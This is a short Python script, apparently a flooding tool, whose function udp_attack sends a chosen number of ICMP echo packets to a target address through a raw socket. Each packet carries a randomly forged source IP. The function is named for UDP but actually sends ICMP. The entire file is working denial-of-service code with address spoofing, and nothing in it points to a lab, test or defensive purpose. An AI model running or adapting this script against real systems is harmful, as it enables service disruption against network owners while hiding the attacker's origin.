#!/usr/bin/env python
import random
import socket
from impacket import ImpactDecoder, ImpactPacket
from colorama import Fore
from pwn import log
#Create a new IP packet and set its source and destination addresses
def udp_attack(target, pkg_range):
	pkg_range = pkg_range + 1
	for i in range(pkg_range):
		num1 = random.randint(1,255)
		num2 = random.randint(1,255)
		num3 = random.randint(1,255)
		num4 = random.randint(1,255)
		num1 = str(num1)
		num2 = str(num2)
		num3 = str(num3)
		num4 = str(num4)
		src = num1+"."+num2+"."+num3+"."+num4
		dst = str(target)
		ip = ImpactPacket.IP()
		ip.set_ip_src(src)
		ip.set_ip_dst(dst)
		 
		#Create a new ICMP packet
		 
		icmp = ImpactPacket.ICMP()
		icmp.set_icmp_type(icmp.ICMP_ECHO)
		 
		#inlude a small payload inside the ICMP packet
		#and have the ip packet contain the ICMP packet
		icmp.contains(ImpactPacket.Data("a"*100))
		ip.contains(icmp)
		 
		s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
		s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
		 
		#give the ICMP packet some ID
		icmp.set_icmp_id(1)
		#calculate checksum
		icmp.set_icmp_cksum(0)
		icmp.auto_checksum = 0
		s.sendto(ip.get_packet(), (dst, 0))
		#print "sender:",Fore.RED+src,Fore.RESET+"  package: ",Fore.GREEN+str(i),Fore.RESET+""
		pr =Fore.GREEN+str(i)+Fore.RESET+""
		pri = Fore.RED+src+Fore.RESET+""
		log.info("Sender: "+pri+" -=- Package: "+pr)
